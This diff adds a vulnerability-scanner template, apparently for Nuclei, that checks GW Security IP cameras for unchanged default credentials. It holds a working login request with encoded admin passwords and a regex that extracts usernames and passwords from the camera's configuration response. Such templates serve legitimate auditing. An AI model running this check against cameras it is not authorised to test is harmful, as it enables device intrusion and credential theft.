@@ -1,0 +1,59 @@
+id: gw-security-camera-default-login
+
+info:
+  name: GW Security IP Camera - Default Login
+  author: mr-pmillz
+  severity: high
+  description: |
+    GW Security IP cameras with unchanged default credentials allow authenticated access to their user configuration endpoint.
+    This template checks encoded administrator credentials and looks for a user configuration response.
+  impact: |
+    An attacker can retrieve camera account configuration and potentially obtain additional credentials from the response.
+  remediation: |
+    Change all default camera account passwords and restrict access to the management interface to trusted hosts.
+  reference:
+    - https://gwsecurityusa.com/wp-content/Firmware/Cameras/50-54-60-80%20Series%20IP%20Cameras/GW50-54-80%20Series%20Quick%20Guide%2020170619.pdf
+  classification:
+    cwe-id: CWE-1392
+  metadata:
+    vendor: gwsecurity
+    product: ip_camera
+  tags: default-login,default-credentials,gwsecurity,network-camera,camera,intrusive
+
+http:
+  - raw:
+      - |+
+        POST /getUserConfig HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+        Accept: text/javascript, text/html, application/xml, text/xml, */*
+        X-Requested-With: XMLHttpRequest
+        Content-type: application/x-www-form-urlencoded
+        Connection: close
+        Cookie: DHLangCookie30=English
+
+        <?xml version="1.0"?><soap:Envelope xmlns:soap="http://www.w3.org/2001/12/soap-envelope"><soap:Header><userid>{{username}}</userid><passwd>{{password}}</passwd></soap:Header><soap:Body></soap:Body></soap:Envelope>
+    payloads:
+      username:
+        - 52851dbd7918bbae # admin
+      password:
+        - a17faccd02661e4c # 123456
+        - 7656e77274aca3c6 # 888888
+        - 52851dbd7918bbae # admin
+    attack: clusterbomb
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<UserConfig>"  # Check if the response contains the UserConfig tag
+
+    extractors:
+      - type: regex
+        part: body
+        name: "Extracted Credentials"
+        regex:
+          - 'Username="([^"]+)" Password="([^"]+)"'  # Extract both username and password in one regex
